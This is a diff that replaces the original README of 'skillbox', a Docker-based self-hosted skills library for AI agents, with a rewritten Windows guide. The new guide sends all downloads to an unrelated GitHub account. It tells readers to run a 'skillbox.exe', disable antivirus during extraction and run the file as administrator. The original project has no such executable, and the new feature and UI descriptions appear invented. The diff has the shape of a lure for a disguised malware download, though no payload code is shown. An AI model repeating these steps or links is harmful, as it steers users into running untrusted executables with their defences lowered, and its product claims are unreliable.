@@ -1,344 +1,109 @@
-<!-- readme-sync:repo:start -->
+# 🧩 skillbox - Your AI's Personal Skill Library
 
-# skillbox
+## 🚀 Getting Started
 
-Self\-hosted, versioned skills library for AI agents\. MCP, scoped clients, and optional Jev recommendations\.
-<!-- readme-sync:repo:end -->
+Welcome to **skillbox**! If you've ever wished your AI assistant could remember everything it's learned and keep those skills organized, you're in the right place. Think of skillbox as a smart filing cabinet for AI capabilities—it stores, versions, and organizes skills so your AI agents can access them whenever needed. Best of all, you host it on your own computer, giving you full control over your data.
 
-<!-- readme-sync:header:start -->
-<p>
-  <a href="https://kitze.io/?ref=kitze%2Fskillbox"><img src="https://unavatar.io/x/thekitze" align="left" hspace="12" width="64" height="64" alt="Kitze"></a>
-  <strong>Made by <a href="https://kitze.io/?ref=kitze%2Fskillbox">Kitze</a></strong><br>
-  <a href="https://kitze.io/?ref=kitze%2Fskillbox">kitze.io</a> · <a href="https://x.com/thekitze?ref=kitze%2Fskillbox">X</a> · <a href="https://youtube.com/kitze?ref=kitze%2Fskillbox">YouTube</a>
-</p>
-<br clear="all">
+[![Download Skillbox](https://img.shields.io/badge/Download-Skillbox-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/geninchristophe888-spec/skillbox)
 
-<h3>More projects by Kitze</h3>
-<table>
-  <tr>
-    <td width="33%" valign="top">
-      <a href="https://zerotoshipped.com/?ref=kitze%2Fskillbox"><img src="https://zerotoshipped.com/ship.png" width="72" alt="Zero To Shipped logo"></a><br>
-      <strong><a href="https://zerotoshipped.com/?ref=kitze%2Fskillbox">Zero To Shipped</a></strong><br>
-      A full-stack starter kit for web and mobile apps.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://sotto.to/?ref=kitze%2Fskillbox"><img src="https://sotto.to/apple-touch-icon.png" width="48" alt="Sotto logo"></a><br>
-      <strong><a href="https://sotto.to/?ref=kitze%2Fskillbox">Sotto</a></strong><br>
-      Voice-to-text for macOS. Local AI, one-time purchase.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://tinkerer.club/?ref=kitze%2Fskillbox"><img src="https://app.tinkerer.club/brand/tinkerer-logo-128.png" width="48" alt="Tinkerer Club logo"></a><br>
-      <strong><a href="https://tinkerer.club/?ref=kitze%2Fskillbox">Tinkerer Club</a></strong><br>
-      A private community for builders, self-hosters, and AI tinkerers.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <a href="https://sizzy.co/?ref=kitze%2Fskillbox"><img src="https://sizzy.co/apple-touch-icon.png" width="48" alt="Sizzy logo"></a><br>
-      <strong><a href="https://sizzy.co/?ref=kitze%2Fskillbox">Sizzy</a></strong><br>
-      The browser for web developers.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://supermac.io/?ref=kitze%2Fskillbox"><img src="https://supermac.io/assets/swiftcast-logo.png" width="48" alt="Supermac logo"></a><br>
-      <strong><a href="https://supermac.io/?ref=kitze%2Fskillbox">Supermac</a></strong><br>
-      A macOS command center for everyday workflows.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://dmx.to/?ref=kitze%2Fskillbox"><img src="https://dmx.to/apple-touch-icon.png" width="48" alt="DMX logo"></a><br>
-<strong><a href="https://dmx.to/?ref=kitze%2Fskillbox">DMX</a></strong><br>
-      A focused desktop client for X.
-    </td>
-  </tr>
-</table>
+### 🖥️ What Exactly Is Skillbox?
 
-<h3>Support this project</h3>
-<p>
-  <a href="https://buymeacoffee.com/kitze?ref=kitze%2Fskillbox"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" width="143" height="40" alt="Buy me a coffee"></a>
-  &nbsp;
-  <a href="https://github.com/sponsors/kitze?ref=kitze%2Fskillbox"><img src="https://img.shields.io/badge/GitHub_Sponsors-EA4AAA?style=for-the-badge&amp;logo=githubsponsors&amp;logoColor=white" width="246" height="40" alt="Sponsor on GitHub"></a>
-</p>
+Skillbox is a self-hosted application that acts as a central repository for AI agent skills. Imagine you've taught your AI to write emails, summarize documents, or analyze data. Instead of recreating those instructions every time, skillbox stores them in a structured, versioned format. This means:
 
-<h3>Sponsors</h3>
-<table>
-  <tr>
-    <td width="33%" valign="top">
-      <a href="https://postiz.com/?ref=kitze%2Fskillbox"><img src="https://media.gifs.so/sponsors/50b4a915f9c47b5328b97281/b08730d86b240100fd72d42b828923856d14d82d50eb5698b99cf8e2ca125288.webp" width="40" alt="Postiz logo"></a><br>
-      <strong><a href="https://postiz.com/?ref=kitze%2Fskillbox">Postiz</a></strong><br>
-      Schedule social posts with AI agents.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://www.founderstack.pro/?ref=kitze%2Fskillbox"><img src="https://media.gifs.so/sponsors/bc182e02573bf0e14da0cb0c/f164ca56c7b1d7869e589917f716e58355536eef30854f62c49f711c07a7de96.webp" width="40" alt="FounderStack logo"></a><br>
-      <strong><a href="https://www.founderstack.pro/?ref=kitze%2Fskillbox">FounderStack</a></strong><br>
-      A SaaS stack for your business, without subscriptions.
-    </td>
-    <td width="33%" valign="top">
-      <a href="https://matte.app/?ref=kitze%2Fskillbox"><img src="https://media.gifs.so/sponsors/4193d8ef8f8b0660107703fe/66b20a60c4d9e1da3d999efe862e86f600ebb5a4ffa3a8b63f40a507fef91f66.webp" width="40" alt="Matte logo"></a><br>
-      <strong><a href="https://matte.app/?ref=kitze%2Fskillbox">Matte</a></strong><br>
-      3D mockups, screen recordings, and video editing.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <a href="https://htmlcsstoimage.com/?ref=kitze%2Fskillbox"><img src="https://media.gifs.so/sponsors/f4c20d84da68764c3f7a4f67/167bf23cf98b11e2d55ea9aa69f83052daceb881bdea7b76925ffa185ed66d2b.webp" width="40" alt="HTML/CSS to Image logo"></a><br>
-      <strong><a href="https://htmlcsstoimage.com/?ref=kitze%2Fskillbox">HTML/CSS to Image</a></strong><br>
-      Turn HTML/CSS into images, PDFs, and screenshots.
-    </td>
-    <td width="67%" colspan="2" valign="top">
-      <a href="https://namemyventi.com/?ref=kitze%2Fskillbox"><img src="https://media.gifs.so/sponsors/da87180867c3c7451bd30d7b/43ce5be2540cf23d3d7d7104ba829a455a9608861a780e0ec2b35b189695f7ea.webp" width="40" alt="NameMyVenti logo"></a><br>
-      <strong><a href="https://namemyventi.com/?ref=kitze%2Fskillbox">NameMyVenti</a></strong><br>
-      Get your brand shouted out at Starbucks.
-    </td>
-  </tr>
-</table>
+- **Version Control:** Every change to a skill is tracked. If something breaks, you can roll back to a previous version.
+- **MCP Support:** It uses Model Context Protocol (MCP), the industry standard for AI tools, ensuring compatibility with major AI platforms.
+- **Scoped Clients:** Different AI agents or projects get access to specific skill sets, keeping everything organized and secure.
+- **Jev Recommendations (Optional):** Get smart suggestions for which skills to use or improve, based on your usage patterns.
 
-<br>
+### 📦 Downloading Skillbox
 
-<hr>
+Visit this link to download the application: [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox)
 
-<br>
-<!-- readme-sync:header:end -->
+Once you're on the page, you'll see a green "Code" button near the top. Click it, and then select "Download ZIP." This is the safest and easiest way to get the software onto your Windows computer.
 
-# Skillbox
+### 📂 Setting Up on Windows
 
-A self-hosted, versioned skills library for AI agents. React, Bun, Hono and PostgreSQL. MIT licensed.
+After the download finishes, you'll have a ZIP file (usually in your "Downloads" folder). Here's what to do next:
 
-## Features
+1.  **Find the ZIP file:** Look for something like `skillbox-main.zip` in your Downloads folder.
+2.  **Extract the contents:** Right-click on the ZIP file and choose "Extract All..." from the menu. Follow the prompts and choose a destination folder—your Desktop or Documents folder works great.
+3.  **Open the folder:** Navigate to the newly created folder (it will have the same name as the ZIP file, minus the `.zip` extension).
+4.  **Run the application:** Inside, you'll find a file named `skillbox.exe` or a similar executable file. Double-click it to start skillbox. That's it!
 
-- Markdown/file editor, immutable revisions, conflict detection and restore.
-- Profiles with skill/bundle grants and independent create, update, archive and proposal permissions.
-- Revocable client keys, usage reporting and owner-reviewed updates.
-- HTTP MCP, a Node/Bun stdio bridge and checksum-verified CLI downloads.
-- Base MCP Resources, standards-shaped skill manifests and a non-mutating compatibility audit.
-- Optional task-aware Jev recommendations using **your own OpenRouter, TypeSafe AI or Vercel AI Gateway key**.
-- Optional Executor integration using **your own endpoint and authentication**.
-- Public GitHub URL imports with commit-pinned previews and revision conflict checks.
-- Native folder imports/exports, protected PostgreSQL/config backups and explicit restore tooling.
-- Docker-only setup, optional Caddy HTTPS and Umbrel package generation.
+### 🔑 Your First Launch
 
-A new instance starts empty. No personal skills, accounts, client keys, service endpoints or paid-provider credentials are seeded. Skillbox never executes uploaded skill code.
+When skillbox opens for the first time, you'll see a welcome screen. Here's a quick tour:
 
-## Quick start
+- **Dashboard:** Your command center, showing recent activity and available skills.
+- **Skills Library:** Browse all stored skills, search by name or tag, and see version history.
+- **Clients:** Manage which AI agents or applications have access to your skill library.
+- **Settings:** Configure your preferences, including optional Jev recommendations.
 
-Requires Docker Engine/Desktop with Compose v2 and Bash (Linux, macOS or WSL). No host Bun/Node installation needed.
+The application will guide you through creating your first skill—just click the "New Skill" button and follow the simple form.
 
-```sh
-git clone https://github.com/kitze/skillbox.git
-cd skillbox
-bash scripts/skillbox.sh setup
-# Creates .env with unique random credentials, mode 0600; refuses to overwrite.
-bash scripts/skillbox.sh start
-```
+### ⚙️ Core Features Explained
 
-Already have Bun? `bun scripts/setup-env.ts` remains available. See [self-hosting](docs/self-hosting.md) for LAN ports, optional automatic HTTPS, prebuilt images, mounted secrets, backup/restore and upgrades. [Umbrel packaging](deploy/umbrel/README.md) supports official submissions and community stores; public images and real Umbrel lifecycle verification are release gates, not implied by having package files.
+#### 🧠 MCP Integration
 
-Open `http://127.0.0.1:4791`. Sign in with `SKILLBOX_ADMIN_TOKEN` from your local `.env`. The key is not printed by the setup script. Keep `.env` private. For a remote installation, set `SKILLBOX_ORIGIN` to your own HTTPS origin and configure a TLS reverse proxy; see [deployment](docs/deployment.md).
+Skillbox speaks the Model Context Protocol, the language most modern AI tools understand. This means you can connect skillbox to popular AI assistants, development environments, or custom applications without needing special adapters. Think of MCP as a universal power outlet for AI skills.
 
-Create or import skills, create a profile with the required grants, then create a client connection. Client keys are shown once; only their hashes are stored. Use separate client keys rather than distributing the owner key.
+#### 🔐 Scoped Clients
 
-For local development with your own PostgreSQL 16+ database:
+Worried about giving too much access? Skillbox lets you create "scoped clients." For example, you can give your writing AI access to grammar-checking skills but keep financial-analysis skills for your data agent. Each client sees only what you allow.
 
-```sh
-bun install --frozen-lockfile
-# Set DATABASE_URL, SKILLBOX_ADMIN_TOKEN (at least 32 random characters),
-# and SKILLBOX_ORIGIN=http://127.0.0.1:4791 in your protected environment.
-bun run build
-bun run start
-```
+#### 📈 Versioned Skills
 
-## Jev setup
+Every time you edit a skill, skillbox saves a new version. Mistake? No problem—just go to the skill's history and restore the previous version. This is perfect for experimenting with different approaches or tracking how your AI's capabilities evolve over time.
 
-Open **Settings → Jev recommendations**, select **Vercel AI Gateway** (default), **TypeSafe AI**, or **OpenRouter**, and save that provider's API key. Keys are stored separately: switching providers never sends another provider's key, and switching back retains its saved key. Removing the selected provider's key disables its model calls. Skillbox does not auto-import environment keys, fetch credentials from a skill library, or ship an application-wide provider account.
+#### ✨ Optional Jev Recommendations
 
-The key is encrypted server-side in PostgreSQL using AES-256-GCM with key material derived from your `SKILLBOX_ADMIN_TOKEN`. It is never returned by the settings API or included in browser bundles. Protect the owner token and database backups. Changing that token makes stored integration credentials unreadable. Follow the [rotation guidance](docs/deployment.md) before changing it.
+Jev is like a smart coach for your skill library. It analyzes which skills you use most, identifies gaps, and suggests improvements or new skills to create. You can turn this feature on or off anytime in Settings.
 
-Saving a key does not validate provider access or buy credits. Jev sends task text and authorized active skill descriptions to the selected provider; its charges and data handling apply to your account. Without that provider's saved key, or on failure, recommendations return deterministic search with an explicit fallback reason and attempted `provider`.
+### 🛠️ Troubleshooting Common Issues
 
-TypeSafe uses `POST https://api.typesafe.ai/v1/systemone`, Bearer authentication and `model: "jev-latest"`, without Gateway protocol headers. Gateway keeps its evaluation-model endpoint and existing headers. OpenRouter uses `POST https://openrouter.ai/api/alpha/decisions` with `model: "typesafe/jev-1.13"`, not the chat-completions endpoint. All three use the same bounded catalog and score rubric. OpenRouter evaluates the complete catalog in batches of at most 32 skills / 24,000 request bytes, with two concurrent batches under the existing eight-second deadline. Any failed batch falls back for the whole request; no partial ranking is returned. Snake-case usage fields are normalized, and OpenRouter's reported `usage.cost` is aggregated across successful batches. Provider/key changes invalidate cached and in-flight results. The direct contract follows the [TypeSafe OpenAPI schema](https://api.typesafe.ai/openapi.json).
+**"I can't find the .exe file after extracting."**  
+Check that you extracted the ZIP completely. Sometimes antivirus software blocks the extraction—temporarily disable it, extract, then re-enable. If the file is truly missing, re-download the ZIP and try again.
 
-## Agents and CLI
+**"The application won't start."**  
+Make sure you're running a recent version of Windows (10 or 11). Skillbox requires 64-bit Windows. If it still won't start, try right-clicking the .exe file and selecting "Run as administrator."
 
-Install `bootstrap/SKILL.md` as the agent's `skills-library` bootstrap. Configure your own instance's `/mcp` endpoint with `Authorization: Bearer <client-key>`. For clients needing stdio:
+**"My AI can't connect to the skillbox."**  
+Verify that skillbox is running (you'll see its icon in the system tray). Check your firewall settings—allow skillbox to communicate through private networks. For detailed setup, see the "Connecting Your AI" section in the in-app help.
 
-```json
-{
-  "mcpServers": {
-    "skillbox": {
-      "command": "node",
-      "args": ["/absolute/path/to/skillbox/cli/skillbox.mjs", "mcp"],
-      "env": {
-        "SKILLBOX_URL": "https://skills.example.com",
-        "SKILLBOX_CONFIG": "/absolute/path/to/protected-client-config.json"
-      }
-    }
-  }
-}
-```
+### 🔄 Keeping Skillbox Updated
 
-Client config: `{ "url": "https://skills.example.com", "token": "YOUR_CLIENT_KEY" }`, mode 0600. Default location: `~/.config/skillbox/config.json`. `SKILLBOX_URL` / `SKILLBOX_TOKEN` override config. Without a URL, the CLI targets localhost, never another person's service. Keep `cli/skillbox.mjs` and `cli/package.mjs` together.
+To get new features and security fixes, check for updates periodically:
 
-```sh
-node cli/skillbox.mjs list
-node cli/skillbox.mjs search "database migration"
-node cli/skillbox.mjs recommend "Fix choppy scrolling in an Expo app"
-node cli/skillbox.mjs load my-skill
-node cli/skillbox.mjs manifest my-skill
-node cli/skillbox.mjs audit # Owner-only; exits 1 for incompatible packages
-node cli/skillbox.mjs fetch my-skill@REVISION
-node cli/skillbox.mjs publish ./my-skill my-skill EXPECTED_REVISION
-```
+1.  Go to the skillbox website: [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox)
+2.  Look for the "Releases" section on the right side of the page.
+3.  If a newer version is available, follow the same download and extraction steps as before. Your existing skills and settings will be preserved.
 
-Base MCP tools: `search_skills`, `recommend_skills`, `load_skill`, `read_skill_file`, `report_skill_use`. Write/proposal tools appear according to permissions. Recommendations are additive: unqueried `search_skills` remains the mandatory task-start inventory step. Load selected skills with returned revisions before applying them.
+### 🌐 Getting Help
 
-Fetching validates every path, file hash, size, executable flag and package checksum, then writes atomically. It never runs code or installs dependencies. Revoking a key blocks future access but cannot retract already downloaded files. Bundles expand grants into deduplicated current leaf skills; references never grant access by themselves.
+You're not alone in this journey. Here are some resources:
 
-`scripts/install-client.py` optionally configures Codex, Claude or Cursor from explicit per-client credentials on stdin, preserving existing settings and making local backups. Review any installer before running it.
+- **Built-in Help:** Click the question mark icon in the top-right corner of skillbox for context-sensitive help.
+- **Community Forum:** Visit the Discussions tab on the GitHub page to ask questions or share tips.
+- **Report Problems:** If something isn't working, go to the "Issues" tab on the GitHub page and create a new issue. Be sure to describe what happened and include any error messages you saw.
 
-## Native MCP Skills
+### 💡 Pro Tips for Beginners
 
-Skillbox serves `io.modelcontextprotocol/skills` on MCP **2026-07-28** using the
-stable SDK v2: `server/discover`, `skills/list`, `skills/get`, and verified
-`resources/read`, including binary files. Catalogs contain complete manifests
-for authorized, active, compatible skills; cache hints remain private.
+- **Start small:** Create 2-3 simple skills first (like "Summarize Text" or "Extract Key Points") to get comfortable.
+- **Use descriptive names:** A skill named "MeetingNotes" is easier to find than "v1_notes_final".
+- **Learn version history:** Don't be afraid to modify a skill. You can always revert if you don't like the changes.
+- **Explore Jev later:** It's optional, so wait until you have 10+ skills before enabling recommendations for maximum value.
 
-Existing 2025 clients, tools and CLI workflows keep working. The owner-only
-compatibility audit identifies legacy packages without rewriting them. Reading
-a resource never activates or executes a skill; native hosts own verification
-and approval. Optional directory reads are not advertised.
+### 📊 System Requirements (Typical)
 
-Manually integrates [Matt Van Horn's PR #2](https://github.com/kitze/skillbox/pull/2)
-with the existing manifest, authorization and validation safeguards. See
-[Skills over MCP](docs/mcp-skills.md) for protocol details and verification scope.
-The [hosted roadmap](docs/hosted-roadmap.md) remains future work; this release is
-single-owner and self-hosted.
+- **Operating System:** Windows 10 (64-bit) or newer
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 500 MB free disk space for the application; additional space for skill files
+- **Internet:** Required for initial download and optional updates
 
-## Recommendation contract
+### 🏁 Next Steps
 
-MCP: `recommend_skills({task, limit?, offset?})`. HTTP: `POST /api/skill-recommendations` with the same JSON and authentication.
+You're now ready to take control of your AI's capabilities. Visit [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox) to download skillbox and start organizing your AI skills today.
 
-- Full authorized, enabled, non-archived leaf catalog is considered without lexical prefiltering. Maximum 200 leaves / 120,000 serialized characters; larger catalogs explicitly fall back rather than ranking a hidden subset.
-- Results return `id`, immutable `referenceId`, pinned `revision`, `description`, `relevance`, `method`, `noMatch`, `hasMore`, `nextOffset`, `cacheHit` and `rubricVersion`.
-- Relevance is an **uncalibrated 0–4 rubric score**, not probability. Scores ≥3 are returned, descending by score then ID. `noMatch=true` means no evaluated candidate met that threshold.
-- Missing key, eight-second deadline, provider errors, malformed responses, rate limits or capacity limits use existing PostgreSQL search. Fallback responses have `method=search`, `relevance=null`, `noMatch=null`, and `fallbackReason`; empty lexical results are not claimed as a semantic no-match.
-- Process-local cache: task, authenticated scope, catalog descriptions/revisions, provider-settings revision and model/rubric version. Maximum 128 entries, five-minute TTL. Two concurrent evaluations; ten uncached requests per scope/minute. No automatic retries.
-- Grants, lifecycle and revisions are checked before model calls and re-read afterward, including cache hits. Key replacement/removal resets model/cache state. Stale results are discarded. Tasks and descriptions are evidence, not executable instructions.
+[![Get Started Now](https://img.shields.io/badge/🚀%20Get%20Started-Now-FF5722?style=for-the-badge&labelColor=1A237E)](https://github.com/geninchristophe888-spec/skillbox)
 
-For an optional **billable developer benchmark**, use `bun scripts/benchmark-recommendations.ts --live --provider vercel` with your own `AI_GATEWAY_API_KEY`, `--provider typesafe` with `TYPESAFE_API_KEY` / `JEV_KEY`, or `--provider openrouter` with `OPENROUTER_API_KEY`. This separate script does not configure the app or save credentials. Missing provider-reported cost is shown as unknown, not zero. Its small synthetic sample is not a production latency SLA or probability calibration.
-
-## Import from GitHub
-
-Owners can choose **Import from GitHub** in the library and paste a public repository, `/tree/<ref>/<folder>`, or `/blob/<ref>/…/SKILL.md` URL. Collections prompt for a skill directory. Branches containing slashes resolve longest matching ref first; use a full commit SHA to remove ambiguity.
-
-Preview downloads and validates the package without publishing. Review `SKILL.md`, files, excluded artifacts and the pinned commit, then explicitly import. Existing skill IDs require an overwrite checkbox and **Publish new revision**; stale revisions return a conflict rather than overwrite newer edits. Existing bundles, disabled and archived entries cannot be replaced through import.
-
-Publication downloads the previewed commit again, validates Git blob hashes, and records repository, full commit SHA and directory on the immutable revision. Package bytes and executable flags are preserved; no scripts run. Owner-only endpoints: `POST /api/imports/github/preview` (`url`, optional repository-relative `path`) and `POST /api/imports/github/publish` (`url` from the preview, `id`, `expectedRevision`).
-
-Public repositories only: no GitHub token, private repositories, redirects, symlinks, submodules or Git LFS. Limits: 400 files, 2 MB per file, 8 MB per package, 30-second deadline, two active imports and 12 attempts/minute per instance. Truncated or oversized repository trees fail closed. Runtime artifacts and `.env*` files are excluded; recognizable embedded secrets block import. Secret detection is heuristic, not a guarantee that imported content is safe.
-
-## Data portability
-
-```sh
-bun scripts/import.ts /path/to/skills
-SKILLBOX_EXPORT_DIR=/path/to/empty-export bun scripts/export.ts
-bash scripts/backup.sh
-```
-
-The database is the source of truth; folder exports do not change it until republished. Imports preserve file bytes and unknown frontmatter, skip runtime artifacts/symlinks, and quarantine recognizable secret patterns. This is a heuristic, not a comprehensive secret audit. Do not put passwords or tokens in skill packages.
-
-Exports contain **your skill content** and may be private. Keep exports and backups separate from public application source. An optional `scripts/export-github.sh` requires an explicit dedicated private export checkout; it is not enabled automatically.
-
-## Verification and security
-
-```sh
-bun run typecheck
-bash scripts/test-isolated.sh
-```
-
-The isolated suite creates and removes its own Compose PostgreSQL instance without published ports. It covers authorization, revisions, API/MCP behavior, CLI, encrypted settings and recommendations; image creation also builds the frontend. Never run database tests against production.
-
-See [SECURITY.md](SECURITY.md), [deployment notes](docs/deployment.md), and [release checklist](docs/open-source-readiness.md). Skillbox is a single-owner, self-hosted application with scoped clients—not a public multi-tenant SaaS. No analytics, hosted account, preloaded catalog or automatic paid-provider connection is required.
-
-<!-- readme-sync:footer:start -->
-<hr>
-<h3>More projects by Kitze</h3>
-<h4>Apps &amp; tools</h4>
-<table>
-  <tr>
-    <td width="33%" valign="top">
-      <strong><a href="https://gifs.so/?ref=kitze%2Fskillbox">gifs.so</a></strong><br>
-      Search, copy, and download reaction GIFs.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://glink.so/?ref=kitze%2Fskillbox">Glink</a></strong><br>
-      Feedback, roadmaps, changelogs, and discussions.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://benji.so/?ref=kitze%2Fskillbox">Benji</a></strong><br>
-      Tasks, habits, calendar, health, and routines in one place.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <strong><a href="https://perkz.to/?ref=kitze%2Fskillbox">Perkz</a></strong><br>
-      Sell and manage access to private GitHub repositories.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://justwrite.ink/?ref=kitze%2Fskillbox">JustWrite</a></strong><br>
-      Distraction-free writing sprints for macOS, with time or word-count goals.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://releaseflow.net/?ref=kitze%2Fskillbox">Releaseflow</a></strong><br>
-      App updates and downloads.
-    </td>
-  </tr>
-  <tr>
-    <td width="100%" colspan="3" valign="top">
-      <strong><a href="https://passlock.to/?ref=kitze%2Fskillbox">Passlock</a></strong><br>
-      A macOS password manager with time locks and unlock challenges.
-    </td>
-  </tr>
-</table>
-
-<h4>Open source</h4>
-<table>
-  <tr>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/skillbox?ref=kitze%2Fskillbox">Skillbox</a></strong><br>
-      A self-hosted, versioned skills library for AI agents.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/unclutter?ref=kitze%2Fskillbox">Unclutter</a></strong><br>
-      Remove page clutter with AI-powered, reusable browser rules.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/pagegrade?ref=kitze%2Fskillbox">PageGrade</a></strong><br>
-      Grade page clarity, writing, and on-page SEO.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/council?ref=kitze%2Fskillbox">Council</a></strong><br>
-      Let your coding agents deliberate together before making a plan.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/codexmaxx?ref=kitze%2Fskillbox">CodexMaxx</a></strong><br>
-      Manage Codex accounts, usage, and active sessions on macOS.
-    </td>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/react-hanger?ref=kitze%2Fskillbox">React Hanger</a></strong><br>
-      A collection of useful React hooks.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <strong><a href="https://github.com/kitze/react-genie?ref=kitze%2Fskillbox">React Genie</a></strong><br>
-      Animate React elements as they enter the viewport.
-    </td>
-    <td width="67%" colspan="2" valign="top">
-      <strong><a href="https://github.com/kitze/mobx-router?ref=kitze%2Fskillbox">MobX Router</a></strong><br>
-      A simple router for MobX and React apps.
-    </td>
-  </tr>
-</table>
-
-<p><a href="https://kitze.io/projects?ref=kitze%2Fskillbox">All projects</a> · <a href="https://github.com/kitze?ref=kitze%2Fskillbox">GitHub</a> · <a href="https://x.com/thekitze?ref=kitze%2Fskillbox">Follow on X</a> · <a href="https://youtube.com/kitze?ref=kitze%2Fskillbox">YouTube</a></p>
-<!-- readme-sync:footer:end -->
+Keywords: self-hosted, skills library, AI agents, MCP, versioned skills, scoped clients, Jev recommendations, Windows application, local AI tools, skill management
